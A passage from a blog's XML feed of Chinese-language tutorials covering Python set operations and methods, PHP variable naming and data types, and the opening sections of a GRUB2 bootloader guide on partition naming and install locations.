class="number">74</span>]: b=set()</span><br><span class="line">    </span><br><span class="line">In [<span class="number">77</span>]: s                                                   </span><br><span class="line">Out[<span class="number">77</span>]: &#123;<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">78</span>]: s = set([<span class="number">1</span>,<span class="number">0</span>,<span class="number">3.14</span>,<span class="string">"hello"</span>])                         </span><br><span class="line"></span><br><span class="line">In [<span class="number">79</span>]: s                                                   </span><br><span class="line">Out[<span class="number">79</span>]: &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3.14</span>, <span class="string">'hello'</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">81</span>]: c=set(<span class="string">"12345678"</span>)                                   </span><br><span class="line"></span><br><span class="line">In [<span class="number">82</span>]: c                                                   </span><br><span class="line">Out[<span class="number">82</span>]: &#123;<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>&#125;</span><br></pre></td></tr></table></figure><ul><li><p>集合的运算</p><p>交集，并集，补集，子集，超集</p><ol><li><p>交集 - &amp;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">86</span>]: s1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">87</span>]: s2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">88</span>]: s3 = s1 &amp; s2                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">89</span>]: s3                                                  </span><br><span class="line">Out[<span class="number">89</span>]: &#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><ol start="2"><li><p>并集 - |</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">93</span>]: s1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">94</span>]: s2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">95</span>]: s3 = s1 | s2                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">96</span>]: s3                                                  </span><br><span class="line">Out[<span class="number">96</span>]: &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>补集 - -</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">97</span>]: s1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">98</span>]: s2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;                                        </span><br><span class="line"><span class="comment">#生成属于s1 但 不属于s2的所有的元素</span></span><br><span class="line">In [<span class="number">99</span>]: s3 = s1 - s2                                        </span><br><span class="line"></span><br><span class="line">In [<span class="number">100</span>]: s3                                                 </span><br><span class="line">Out[<span class="number">100</span>]: &#123;<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>对称补集 - ^</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">101</span>]: s1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;                                       </span><br><span class="line"></span><br><span class="line">In [<span class="number">102</span>]: s2 = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;                                       </span><br><span class="line"></span><br><span class="line">In [<span class="number">103</span>]: s3 = s1 ^ s2                                       </span><br><span class="line"></span><br><span class="line">In [<span class="number">104</span>]: s3                                                 </span><br><span class="line">Out[<span class="number">104</span>]: &#123;<span class="number">1</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>超集 &gt;</p></li><li><p>子集 &lt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">105</span>]: s1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;                                       </span><br><span class="line"></span><br><span class="line">In [<span class="number">106</span>]: s2 = &#123;<span class="number">2</span>,<span class="number">3</span>&#125;                                         </span><br><span class="line"></span><br><span class="line">In [<span class="number">107</span>]: s1 &gt; s2                                            </span><br><span class="line">Out[<span class="number">107</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">108</span>]: s1 &lt; s2                                            </span><br><span class="line">Out[<span class="number">108</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p>集合的相等 ==</p></li><li><p>集合的不等 !=</p></li></ol><ul><li><p>成员运算in , not in</p><p>等同于字典 in , not in</p><p>目的：判断某个值在集合中存在 / 不存在</p></li></ul><ul><li><p>用于集合的内建函数</p><ol><li><p>len(set) : 集合内元素的个数</p></li><li><p>max(set) : 最大值</p></li><li><p>min(set) : 最小值</p></li><li><p>sum(set) : 和</p></li><li><p>any(set) : 任何一个元素为真，则返回真</p></li><li><p>all(set) : 所有元素为真，则返回真</p></li></ol></li></ul><ul><li><p>元组方法</p><ol><li><p>add()方法</p><p>向集合内增加元素，如果添加的元素已经存在的话，则不执行任何操作</p><p>集合对象.add(elem)</p><p>elem 表示要增加的元素</p></li></ol></li></ul><ol start="2"><li><p>clear()方法</p><p>清空集合内所有的元素</p><p>集合对象.clear()</p></li></ol><ol start="3"><li><p>copy()方法</p><p>复制一个集合</p><ol start="4"><li>difference()方法</li></ol><p>返回两个集合的补集</p><p>集合对象1.difference(集合对象2)<br>参数 ：集合对象2 ，表示计算补集的另外一个集合<br>返回值 ：补集结果，即出现在集合1中但没出现在集合2中的元素集合<br>等同于： 集合对象1 - 集合对象2</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;变量的定义&quot;&gt;&lt;a href=&quot;#变量的定义&quot; class=&quot;headerlink&quot; title=&quot;变量的定义&quot;&gt;&lt;/a&gt;变量的定义&lt;/h3&gt;&lt;p&gt;变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。&lt;/p&gt;
&lt;p&gt;在pytho
      
    
    </summary>
    
    
      <category term="编程基础" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PHP变量</title>
    <link href="http://yoursite.com/2020/02/17/PHP%E5%8F%98%E9%87%8F/"/>
    <id>http://yoursite.com/2020/02/17/PHP%E5%8F%98%E9%87%8F/</id>
    <published>2020-02-17T09:48:27.000Z</published>
    <updated>2020-02-25T16:09:48.019Z</updated>
    
    <content type="html"><![CDATA[<h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3><p>变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。</p><p>在php中，变量会在首次出现时为其赋值时被创建，无需事先声明<em>变量的类型，变量类型</em>是在运行过程中根据对象的类型自动决定的。在使用中，可以随意改变变量的类型。而在c语言中，变量则需要先创建才能使用，并且需要严格定义类型。</p><h3 id="如何定义变量"><a href="#如何定义变量" class="headerlink" title="如何定义变量"></a>如何定义变量</h3><p>定义变量就是向服务器的内存申请空间，用来存储数据。这时候我们就需要用到变量名和变量值。</p><p>变量名只有在第一次出现的时候，才是定义变量。当再次出现时，不是定义变量，而是直接使用之前定义的变量。</p><p>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var_name = “php”</span><br><span class="line">$n = <span class="number">10</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在“=”左边是变量名，右边是变量值，完成定义变量后，需要一个<code>；</code>告诉服务器这行指令已经结束。其中变量名必须通过<code>$</code>符号标识；“=”可不是我们平常所说的等号哦，在PHP中，<code>=</code>是赋值运算符</p><h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><p>变量名除了需要“$”进行标识外，还有一些规则需要遵守。变量名的命名规则主要有三条：</p><ol><li><p>变量名只能包括<strong>字母</strong>、<strong>数字</strong>和<strong>下划线</strong>。变量名<strong>不能以数字开头</strong>。如”$_name”,”$name” ,”$name2”等，但是”$9name”,”$name*”是不对的。</p></li><li><p>变量名不允许包含空格。当变量名由多个单词组成，建议使用“_”进行分隔（比如 $my_apple），俗称下划线法，或者以大写字母开头比如 $myApple，俗称骆驼式命名法（也称驼峰命名法）。</p></li><li><p>不能使用PHP 保留关键字中它们的任何一个作为常量、方法名或是类名。但是可以将它们作为变量名使用，不过这样会导致混淆。</p></li><li><p>在PHP中变量名是区分大小写的，如“$my_book”与“$my_Book”代表两个不同的变量。</p></li></ol><h3 id="变量的数据类型"><a href="#变量的数据类型" class="headerlink" title="变量的数据类型"></a>变量的数据类型</h3><p>在变量中，由于变量占用的空间单元不一样（占的地盘大小不一样），也分成几种数据类型，我们可以通过使用“memory_get_usage”获取当前PHP消耗的内存。</p><p>PHP是一门松散类型的语言，不必声明变量的数据类型，PHP会自动把变量转换为自动的数据类型，而C语言或者JAVA语言，在声明变量的时候需要声明变量的数据类型。</p><p>在PHP中，支持8种原始类型，其中包括四种标量类型、两种复合类型和两种特殊类型。</p><ul><li>四种标量类型：<ol><li>布尔（Boolean）</li><li>整型（Integer）</li><li>浮点型（Float）</li><li>字符串（String）</li></ol></li></ul><ul><li>两种复合类型：<ol><li>数组（Array）</li><li>对象（object）</li></ol></li></ul><ul><li>两种特殊类型<ol><li>资源（Resource）</li><li>NULL（NULL）</li></ol></li></ul><h4 id="标量类型—布尔类型（Boolean）"><a href="#标量类型—布尔类型（Boolean）" class="headerlink" title="标量类型—布尔类型（Boolean）"></a>标量类型—布尔类型（Boolean）</h4><p>布尔类型（boolean）：只有两个值，一个是TRUE，另一个FALSE，可以理解为是或否。它不区分大小写，也就是说”TRUE”和“true”效果是一样的。主要用在条件结构中，例如判断是否满足条件的时候，是用“true”表示满足，用“false”表示不满足。需要注意的是，当我们用”echo”指令输出布尔类型时，如果是“true”则输出的是“1”，“false”则什么也不输出。我们可以使用“var_dump”函数，获取它真正的数据类型。</p><p>输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$man = <span class="string">"男"</span>;</span><br><span class="line">$flag = $man ==<span class="string">"男"</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span> ;</span><br><span class="line">var_dump($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出：</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h4 id="标量类型—整型"><a href="#标量类型—整型" class="headerlink" title="标量类型—整型"></a>标量类型—整型</h4><p>整型（integer）：类似于常见的整数。它可以用十进制、八进制、十六进制指定。十进制就是日常使用的数字；八进制，数字前必须加上“0”；十六进制，数字前必须加“0x” 。</p><h4 id="标量类型—浮点型"><a href="#标量类型—浮点型" class="headerlink" title="标量类型—浮点型"></a>标量类型—浮点型</h4><p>浮点型（Float）：就是通常说的小数，可以用小数点或者科学计数法表示。科学计数法可以使用小写的e，也可以使用大写的E。</p><h4 id="标量类型—字符串"><a href="#标量类型—字符串" class="headerlink" title="标量类型—字符串"></a>标量类型—字符串</h4><p>字符串（String）：字符串是由一系列字符组成，在PHP中，字符和字节一样，也就是说，一共有256种不同字符的可能性。</p><p>字符串型可以用三种方法定义：单引号形式、双引号形式和Heredoc结构形式。</p><blockquote><p>注意：</p></blockquote><ul><li><p>当字符串中包含引号的时：</p><ol><li>在单引号中嵌入双引号</li><li>在双引号中嵌入单引号</li><li>使用转义符“\”</li></ol></li><li><p>当字符串中包含$时：</p><ol><li><p>当双引号中包含变量时，变量会与双引号中的内容连接在一起</p></li><li><p>当单引号中包含变量时，变量会被当做字符串输出</p><p>输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$love = <span class="string">"I love you!"</span>;</span><br><span class="line">$string1 = <span class="string">"慕课网,$love"</span>;</span><br><span class="line">$string2 = <span class="string">'慕课.$love'</span>;</span><br><span class="line"><span class="keyword">echo</span> $string1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $string2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">慕课网,I love you!</span><br><span class="line">慕课.$love</span><br></pre></td></tr></table></figure></li></ol></li><li><p>当我的字符串很长时：</p><p>我们可以使用Heredoc结构（文本结构）形式的方法来解决该问题，首先使用定界符表示字符串（&lt;&lt;&lt;），接着在“&lt;&lt;&lt;“之后提供一个标识符（任意，但与结尾处必须一样），然后是字符串，最后以提供的这个标识符结束字符串。</p></li></ul><h4 id="复合类型—数组"><a href="#复合类型—数组" class="headerlink" title="复合类型—数组"></a>复合类型—数组</h4><p>数组（array）：数组是一个很特殊的数据类型，可以在一个变量中存储多个数据。在php中，使用array()函数来创建数组。</p><h4 id="复合类型—对象"><a href="#复合类型—对象" class="headerlink" title="复合类型—对象"></a>复合类型—对象</h4><p>对象（object）：对象也是一种特殊的数据类型，是存储数据和有关如何处理数据的信息的数据类型。在php中，创建对象用new关键字。</p><h4 id="特殊类型—资源"><a href="#特殊类型—资源" class="headerlink" title="特殊类型—资源"></a>特殊类型—资源</h4><p>资源（resource）：资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源，在不需要的时候应该被及时释放。如果我们忘记了释放资源，系统自动启用垃圾回收机制，在页面执行完毕后回收资源，以避免内存被消耗殆尽。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=fopen(<span class="string">"f.txt"</span>,<span class="string">"r"</span>);   <span class="comment">//打开文件</span></span><br><span class="line">$con=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);  <span class="comment">//连接数据库</span></span><br><span class="line">$img=imagecreate(<span class="number">100</span>,<span class="number">100</span>);<span class="comment">//图形画布</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="特殊类型—空类型"><a href="#特殊类型—空类型" class="headerlink" title="特殊类型—空类型"></a>特殊类型—空类型</h4><p>NULL（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;变量的定义&quot;&gt;&lt;a href=&quot;#变量的定义&quot; class=&quot;headerlink&quot; title=&quot;变量的定义&quot;&gt;&lt;/a&gt;变量的定义&lt;/h3&gt;&lt;p&gt;变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。&lt;/p&gt;
&lt;p&gt;在php中，
      
    
    </summary>
    
    
      <category term="编程基础" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>GRUB手册</title>
    <link href="http://yoursite.com/2020/02/08/GRUB%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/02/08/GRUB%E6%89%8B%E5%86%8C/</id>
    <published>2020-02-08T15:40:46.000Z</published>
    <updated>2020-02-26T02:04:27.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础内容"><a href="#1-基础内容" class="headerlink" title="1 基础内容"></a>1 基础内容</h1><h2 id="1-1-grub2和grub的区别"><a href="#1-1-grub2和grub的区别" class="headerlink" title="1.1 grub2和grub的区别"></a>1.1 grub2和grub的区别</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Changes-from-GRUB-Legacy.html#Changes-from-GRUB-Legacy" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Changes-from-GRUB-Legacy.html#Changes-from-GRUB-Legacy</a></p><p>只说明几个主要的：</p><p>1.配置文件的名称改变了。在grub中，配置文件为grub.conf或menu.lst(grub.conf的一个软链接)，在grub2中改名为grub.cfg。</p><p>2.grub2增添了许多语法，更接近于脚本语言了，例如支持变量、条件判断、循环。</p><p>3.grub2中，设备分区名称从1开始，而在grub中是从0开始的。</p><p>4.grub2使用img文件，不再使用grub中的stage1、stage1.5和stage2。</p><p>5.支持图形界面配置grub，但要安装grub-customizer包，epel源提供该包。</p><p>6.在已进入操作系统环境下，不再提供grub命令，也就是不能进入grub交互式界面，只有在开机时才能进入，算是一大缺憾。</p><p>7.在grub2中没有了好用的find命令，算是另一大缺憾。</p><h2 id="1-2-命名习惯和文件路径表示方式"><a href="#1-2-命名习惯和文件路径表示方式" class="headerlink" title="1.2 命名习惯和文件路径表示方式"></a>1.2 命名习惯和文件路径表示方式</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/Naming-convention.html#Naming-convention" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/Naming-convention.html#Naming-convention</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(fd0)           ：表示第一块软盘</span><br><span class="line">(hd0,msdos2)    ：表示第一块硬盘的第二个mbr分区。grub2中分区从1开始编号，传统的grub是从0开始编号的</span><br><span class="line">(hd0,msdos5)    ：表示第一块硬盘的第一个逻辑分区</span><br><span class="line">(hd0,gpt1)      ：表示第一块硬盘的第一个gpt分区</span><br><span class="line">&#x2F;boot&#x2F;vmlinuz   ：相对路径，基于根目录，表示根目录下的boot目录下的vmlinuz，</span><br><span class="line">                ：如果设置了根目录变量root为(hd0,msdos1)，则表示(hd0,msdos1)&#x2F;boot&#x2F;vmlinuz</span><br><span class="line">(hd0,msdos1)&#x2F;boot&#x2F;vmlinuz：绝对路径，表示第一硬盘第一分区的boot目录下的vmlinuz文件</span><br></pre></td></tr></table></figure><h2 id="1-3-grub2引导操作系统的方式"><a href="#1-3-grub2引导操作系统的方式" class="headerlink" title="1.3 grub2引导操作系统的方式"></a>1.3 grub2引导操作系统的方式</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/General-boot-methods.html#General-boot-methods" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/General-boot-methods.html#General-boot-methods</a></p><p>grub2支持两种方式引导操作系统：</p><ul><li>直接引导：(direct-load)直接通过默认的grub2 boot loader来引导写在默认配置文件中的操作系统</li><li>链式引导：(chain-load)使用默认grub2 boot loader链式引导另一个boot loader，该boot loader将引导对应的操作系统</li></ul><p>一般只使用第一种方式，只有想引导grub默认不支持的操作系统时才会使用第二种方式。</p><h2 id="1-4-grub2程序和传统grub程序安装后的文件分布"><a href="#1-4-grub2程序和传统grub程序安装后的文件分布" class="headerlink" title="1.4 grub2程序和传统grub程序安装后的文件分布"></a>1.4 grub2程序和传统grub程序安装后的文件分布</h2><p>在传统grub软件安装完后，在/usr/share/grub/RELEASE/目录下会生成一些stage文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@xuexi ~]# ls &#x2F;usr&#x2F;share&#x2F;grub&#x2F;x86_64-redhat&#x2F;</span><br><span class="line">e2fs_stage1_5      ffs_stage1_5       jfs_stage1_5       reiserfs_stage1_5  stage2             ufs2_stage1_5      xfs_stage1_5</span><br><span class="line">fat_stage1_5       iso9660_stage1_5   minix_stage1_5     stage1             stage2_eltorito    vstafs_stage1_5</span><br></pre></td></tr></table></figure><p>在grub2软件安装完后，会在/usr/lib/grub/i386-pc/目录下生成很多模块文件和img文件，还包括一些lst列表文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@server7 ~]# ls &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;*.mod | wc -l</span><br><span class="line">257</span><br><span class="line"></span><br><span class="line">[root@server7 ~]# ls -lh &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;*.lst   </span><br><span class="line">-rw-r--r--. 1 root root 3.7K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;command.lst</span><br><span class="line">-rw-r--r--. 1 root root  936 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;crypto.lst</span><br><span class="line">-rw-r--r--. 1 root root  214 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;fs.lst</span><br><span class="line">-rw-r--r--. 1 root root 5.1K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;moddep.lst</span><br><span class="line">-rw-r--r--. 1 root root  111 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;partmap.lst</span><br><span class="line">-rw-r--r--. 1 root root   17 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;parttool.lst</span><br><span class="line">-rw-r--r--. 1 root root  202 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;terminal.lst</span><br><span class="line">-rw-r--r--. 1 root root   33 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;video.lst</span><br><span class="line"></span><br><span class="line">[root@server7 ~]# ls -lh &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;*.img</span><br><span class="line">-rw-r--r--. 1 root root  512 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;boot_hybrid.img</span><br><span class="line">-rw-r--r--. 1 root root  512 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;boot.img</span><br><span class="line">-rw-r--r--. 1 root root 2.0K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;cdboot.img</span><br><span class="line">-rw-r--r--. 1 root root  512 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;diskboot.img</span><br><span class="line">-rw-r--r--. 1 root root  28K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;kernel.img</span><br><span class="line">-rw-r--r--. 1 root root 1.0K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;lnxboot.img</span><br><span class="line">-rw-r--r--. 1 root root 2.9K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;lzma_decompress.img</span><br><span class="line">-rw-r--r--. 1 root root 1.0K Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;grub&#x2F;i386-pc&#x2F;pxeboot.img</span><br></pre></td></tr></table></figure><h2 id="1-5-boot-loader和grub的关系"><a href="#1-5-boot-loader和grub的关系" class="headerlink" title="1.5 boot loader和grub的关系"></a>1.5 boot loader和grub的关系</h2><p>当使用grub来管理启动菜单时，那么boot loader都是grub程序安装的。</p><p>传统的grub将stage1转换后的内容安装到MBR(VBR或EBR)中的boot loader部分，将stage1_5转换后的内容安装在紧跟在MBR后的扇区中，将stage2转换后的内容安装在/boot分区中。</p><p>grub2将boot.img转换后的内容安装到MBR(VBR或EBR)中的boot  loader部分，将diskboot.img和kernel.img结合成为core.img，同时还会嵌入一些模块或加载模块的代码到core.img中，然后将core.img转换后的内容安装到磁盘的指定位置处。</p><p>它们之间更具体的关系见下文。</p><h2 id="1-6-grub2的安装位置"><a href="#1-6-grub2的安装位置" class="headerlink" title="1.6 grub2的安装位置"></a>1.6 grub2的安装位置</h2><p>官方手册原文：<a href="https://www.gnu.org/software/grub/manual/html_node/BIOS-installation.html#BIOS-installation" target="_blank" rel="noopener">https://www.gnu.org/software/grub/manual/html_node/BIOS-installation.html#BIOS-installation</a></p><p>严格地说是core.img的安装位置，因为boot.img的位置是固定在MBR或VBR或EBR上的。</p><p>(1).MBR</p><p>MBR格式的分区表用于PC BIOS平台，这种格式允许四个主分区和额外的逻辑分区。使用这种格式的分区表，有两种方式安装GURB：</p><ol><li>嵌入到MBR和第一个分区中间的空间，这部分就是大众所称的”boot track”,”MBR gap”或”embedding area”，它们大致需要31kB的空间；</li><li>将core.img安装到某个文件系统中，然后使用分区的第一个扇区(严格地说不是第一个扇区，而是第一个block)存储启动它的代码。</li></ol><p>这两种方法有不同的问题。</p><p>使用嵌入的方式安装grub，就没有保留的空闲空间来保证安全性，例如有些专门的软件就是使用这段空间来实现许可限制的；另外分区的时候，虽然会在MBR和第一个分区中间留下空闲空间，但可能留下的空间会比这更小。</p><p>方法二安装grub到文件系统，但这样的grub是脆弱的。例如，文件系统的某些特性需要做尾部包装，甚至某些fsck检测，它们可能会移动这些block。</p><p><strong>GRUB开发团队建议将GRUB嵌入到MBR和第一个分区之间，除非有特殊需求，但仍必须要保证第一个分区至少是从第31kB(第63个扇区)之后才开始创建的。</strong></p><p>现在的磁盘设备，一般都会有分区边界对齐的性能优化提醒，所以第一个分区可能会自动从第1MB处开始创建。</p><p>(2).GPT</p><p>一些新的系统使用GUID分区表(GPT)格式，这种格式是EFI固件所指定的一部分。<strong>但如果操作系统支持的话，GPT也可以用于BIOS平台(即MBR风格结合GPT格式的磁盘)，使用这种格式，需要使用独立的BIOS boot分区来保存GRUB</strong>，GRUB被嵌入到此分区，不会有任何风险。</p><p>当在gpt磁盘上创建一个BIOS boot分区时，需要保证两件事：(1)它最小是31kB大小，但一般都会为此分区划分1MB的空间用于可扩展性；(2)必须要有合理的分区类型标识(flag type)。</p><p>例如使用gun parted工具时，可以设置为bios_grub标识：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># parted &#x2F;dev&#x2F;sda toggle partition_num bios_grub&#96;&#96;# parted &#x2F;dev&#x2F;sda set partiton_num bios_grub on</span><br></pre></td></tr></table></figure><p>如果使用gdisk分区工具时，则分类类型设置为”EF02”。</p><p>如果使用其他的分区工具，可能需要指定guid，则可以指定其guid为”21686148-6449-6e6f-744e656564454649”。</p><p>下图是某个bios/gpt格式的bios 